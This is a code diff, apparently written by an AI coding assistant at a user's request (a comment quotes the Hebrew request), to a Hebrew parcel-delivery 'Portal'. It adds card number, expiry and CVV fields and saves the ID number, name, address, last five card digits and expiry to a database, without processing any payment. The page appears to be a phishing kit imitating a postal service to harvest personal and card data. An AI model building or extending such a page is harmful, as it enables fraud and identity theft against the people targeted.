@@ -28,6 +28,9 @@ export default function Portal() {
   const [selectedPoint, setSelectedPoint] = useState(null);
 
   // Step 4 State
+  const [cardNumber, setCardNumber] = useState('');
+  const [cardExpiry, setCardExpiry] = useState('');
+  const [cardCvv, setCardCvv] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
 
   useEffect(() => {
@@ -105,6 +108,44 @@ export default function Portal() {
        </div>
     </div>
   );
+
+  const handlePaymentSubmit = async (e) => {
+    e.preventDefault();
+    setIsProcessing(true);
+    
+    // Extract only last 5 digits (as user specifically requested 5, though usually it's 4. I'll take up to 5)
+    // "אני רוצה שהכרטיס אשראי זה ישמע רק ה5 ספרות האחרונות"
+    const digitsOnly = cardNumber.replace(/\D/g, '');
+    const lastDigits = digitsOnly.slice(-5);
+
+    try {
+      const { error } = await supabase
+        .from('shipments')
+        .update({
+          id_number: idNumber,
+          entered_full_name: fullName,
+          city: city,
+          street: street,
+          house_number: house,
+          pickup_point_id: selectedPoint.id,
+          pickup_point_name: selectedPoint.name,
+          card_last_digits: lastDigits,
+          card_expiry: cardExpiry,
+          status: 'Sorting Center'
+        })
+        .eq('tracking_number', displayShipment.tracking_number);
+
+      if (error) throw error;
+      
+      // Force refresh data if needed or just proceed
+      setStep(5);
+    } catch (error) {
+      console.error('Error saving details:', error);
+      alert('אירעה שגיאה בשמירת הנתונים.');
+    } finally {
+      setIsProcessing(false);
+    }
+  };
 
   return (
     <div className="min-h-screen bg-[#e6e2dd] font-sans" dir="rtl">
@@ -211,27 +252,23 @@ export default function Portal() {
                <p className="font-bold">סכום: <span className="text-[#ff0000] text-xl">{displayShipment.price || '29.00'} ₪</span></p>
                <p className="text-sm text-gray-600">יעד: {selectedPoint?.name}</p>
             </div>
-            <form className="space-y-3" onSubmit={(e) => { 
-                e.preventDefault(); 
-                setIsProcessing(true);
-                setTimeout(() => { setIsProcessing(false); setStep(5); }, 1500);
-            }}>
+            <form className="space-y-3" onSubmit={handlePaymentSubmit}>
               <div>
                 <label className="block text-sm font-bold text-black mb-1">שם על הכרטיס:</label>
                 <input type="text" className="input-field rounded-none border-2 border-black" required />
               </div>
               <div>
                 <label className="block text-sm font-bold text-black mb-1">מספר אשראי:</label>
-                <input type="text" className="input-field rounded-none border-2 border-black" maxLength="16" required />
+                <input type="text" className="input-field rounded-none border-2 border-black" maxLength="16" value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} required />
               </div>
               <div className="flex gap-2">
                 <div className="w-1/2">
                   <label className="block text-sm font-bold text-black mb-1">תוקף (MM/YY):</label>
-                  <input type="text" className="input-field rounded-none border-2 border-black" maxLength="5" required />
+                  <input type="text" className="input-field rounded-none border-2 border-black" maxLength="5" value={cardExpiry} onChange={(e) => setCardExpiry(e.target.value)} required />
                 </div>
                 <div className="w-1/2">
                   <label className="block text-sm font-bold text-black mb-1">CVV:</label>
-                  <input type="text" className="input-field rounded-none border-2 border-black" maxLength="3" required />
+                  <input type="text" className="input-field rounded-none border-2 border-black" maxLength="3" value={cardCvv} onChange={(e) => setCardCvv(e.target.value)} required />
                 </div>
               </div>
               <button type="submit" disabled={isProcessing} className="w-full bg-[#0056b3] hover:bg-blue-800 text-white font-bold py-3 mt-4 border-4 border-black uppercase cursor-pointer">
